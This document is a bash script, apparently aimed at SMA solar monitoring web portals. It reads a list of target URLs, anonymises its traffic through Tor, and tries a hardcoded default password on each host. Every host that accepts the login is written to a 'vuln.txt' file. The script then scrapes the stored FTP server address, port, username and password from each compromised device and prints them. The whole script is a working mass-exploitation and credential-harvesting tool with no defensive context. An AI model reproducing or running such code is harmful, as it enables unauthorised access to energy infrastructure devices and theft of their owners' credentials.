cat urls | while read line
do
echo $line
echo ""

torify timeout 5 curl -sk $line/home_frameset.htm?Logout=true >/dev/null

check=$(torify timeout 5 curl -sk -X POST $line/login -d "Language=fr&Password=sma&ButtonLogin=Connexion" -H "Content-Type: application/x-www-form-urlencoded" | grep "location.reload") 

if [ -z "$check" ];
then
echo "Not Vuln"
else
echo ""


echo "Vuln !"
echo ""
echo $line >> vuln.txt





echo "Grabbing Infos..."
echo ""


torify timeout 5 curl -sk $line/wb_portal.htm > req



FTPURL=$(cat req | grep FTPPushServerUrl | grep -o -P '(?<=<input name="FTPPushServerUrl" type="text" style="width: 150px;" maxlength="128" size="128" class="input-text" value=").*(?=">&nbsp;)')

if [ -z "$FTPURL" ];
then
FTPURL=$(cat req | grep FTPPushServerUrl | grep -o -P '(?<=<input name="FTPPushServerUrl" Value=").*(?=" class="input-text")')
fi

if [ ! -z "$FTPURL" ];
then
echo "FTP URL : $FTPURL" 
fi




FTPPORT=$(cat req | grep FTPPushServerPort | grep -o -P '(?<=<input name="FTPPushServerPort" type="text" style="width: 50px;" maxlength="5" size="5" class="input-text" value=").*(?="></td>)')
if [ -z "$FTPPORT" ];
then
FTPPORT=$(cat req | grep FTPPushServerPort | grep -o -P '(?<=<input name="FTPPushServerPort" Value=").*(?=" class="input-text")')
fi

if [ ! -z "$FTPPORT" ];
then
echo "FTP Port : $FTPPORT"
fi




FTPUSER=$(cat req | grep FTPPushServerAuthenticationUser | grep -o -P '(?<=<input name="FTPPushServerAuthenticationUser" type="text" style="width: 100px;" class="input-text" value=").*(?=">&nbsp;)')
if [ -z "$FTPUSER" ];
then
FTPUSER=$(cat req | grep FTPPushServerAuthenticationUser | grep -o -P '(?<=<input name="FTPPushServerAuthenticationUser" Value=").*(?=" class="input-text")')
fi

if [ ! -z "$FTPUSER" ];
then
echo "FTP User : $FTPUSER" 
fi



FTPPASS=$(cat req | grep FTPPushServerAuthenticationUser | grep -o -P '(?<=type="password" style="width: 100px;" class="input-text" value=").*(?="></td>)')
if [ -z "$FTPPASS" ];
then
FTPPASS=$(cat req | grep FTPPushServerAuthenticationPassword | grep -o -P '(?<=<input name="FTPPushServerAuthenticationPassword" Value=").*(?=" class="input-text")')
fi

if [ ! -z "$FTPPASS" ];
then
echo "FTP Password : $FTPPASS" 
fi
fi




torify timeout 5 curl -sk $line/home_frameset.htm?Logout=true >/dev/null



echo ""
echo ""
done
